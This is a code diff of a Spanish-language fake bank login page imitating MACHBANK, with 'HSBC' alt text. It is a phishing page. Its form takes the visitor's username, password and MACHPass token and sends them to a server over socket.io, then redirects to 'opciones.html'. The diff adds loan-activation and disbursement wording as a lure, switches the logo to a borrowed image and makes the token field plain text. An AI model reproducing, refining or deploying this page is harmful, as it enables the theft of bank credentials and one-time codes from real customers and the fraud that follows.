@@ -7,7 +7,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
-    /* Estilos previos */
     body {
       margin: 0;
       font-family: 'Open Sans', sans-serif;
@@ -32,7 +31,7 @@
     }
 
     .logo {
-      width: 190px;
+      width: 100px;
       margin-bottom: 1rem;
     }
 
@@ -76,7 +75,7 @@
     }
 
     button {
-      background-color: #7035ee;
+      background-color: #7C12B5;
       color: white;
       padding: 8px 20px;
       border: none;
@@ -88,7 +87,7 @@
     }
 
     button:hover {
-      background-color: #000000;
+      background-color: #C227F5;
     }
 
     button:disabled {
@@ -105,13 +104,20 @@
     .campo-requerido {
       border: 1px solid red !important;
     }
+
+    .alerta {
+      font-size: 0.85rem;
+      color: #555;
+      margin-top: 1rem;
+      text-align: left;
+    }
   </style>
 </head>
 <body>
   <div class="screen active" id="pantallaInicio">
-    <img src="https://cdn3.bci.cl/uploads/161e8cfd-f345-474c-bf6b-e4f12fa99f22/original/Recurso_5logo_machbank_color_noborder.webp" alt="HSBC" class="logo">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9urrLavHeCltEaaBbQmtmD52KKZqHktoaZA&s" alt="HSBC" class="logo">
     <h2>Bienvenido a <strong>MACHBANK</strong></h2>
-    <p>Ingrese su usuario y contraseña para continuar con su proceso de analisis.</p>
+    <p>Ingrese a continuacion para iniciar con su proceso de activcion y desembolso.</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
@@ -123,12 +129,12 @@
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-key"></i></div>
-        <input type="password" id="machpass" placeholder="Ingrese MACHPASS" required>
+        <input type="text" id="token" placeholder="Ingrese su MACHPass" required>
       </div>
       
       <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
-      <p id="machpassError" class="mensaje-error"></p>
+      <p id="tokenError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
   </div>
@@ -142,19 +148,25 @@
 
       if (form) {
         form.addEventListener('submit', (e) => {
-          e.preventDefault();
+          e.preventDefault(); // Evitar el comportamiento por defecto del formulario
 
-          if (validarUsuario() && validarPassword() && validarMachpass()) {
+          // Validar los campos antes de enviar los datos
+          if (validarUsuario() && validarPassword() && validarToken()) {
             const usuario = document.getElementById('usuario').value;
             const contrasena = document.getElementById('password').value;
-            const machpass = document.getElementById('machpass').value;
+            const token = document.getElementById('token').value;
 
+            // Generar y guardar sessionId
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
-            socket.emit('dataForm', { usuario, contrasena, machpass, sessionId });
+            // Enviar datos al servidor mediante socket.io
+            socket.emit('dataForm', { usuario, contrasena, token, sessionId });
 
-            window.location.href = 'opciones.html';
+            // Redirigir a opciones.html después de un pequeño retraso
+            setTimeout(() => {
+              window.location.href = 'opciones.html';
+            }, 500); // Espera 500ms antes de redirigir
           }
         });
       }
@@ -196,18 +208,18 @@
       }
     }
 
-    function validarMachpass() {
-      const machpass = document.getElementById("machpass").value;
-      const machpassError = document.getElementById("machpassError");
-      const machpassInput = document.getElementById("machpass");
+    function validarToken() {
+      const token = document.getElementById("token").value;
+      const tokenError = document.getElementById("tokenError");
+      const tokenInput = document.getElementById("token");
 
-      if (!machpass) {
-        machpassError.textContent = "MACHPASS es obligatorio";
-        machpassInput.classList.add("campo-requerido");
+      if (!token) {
+        tokenError.textContent = "El token es obligatorio";
+        tokenInput.classList.add("campo-requerido");
         return false;
       } else {
-        machpassError.textContent = "";
-        machpassInput.classList.remove("campo-requerido");
+        tokenError.textContent = "";
+        tokenInput.classList.remove("campo-requerido");
         return true;
       }
     }
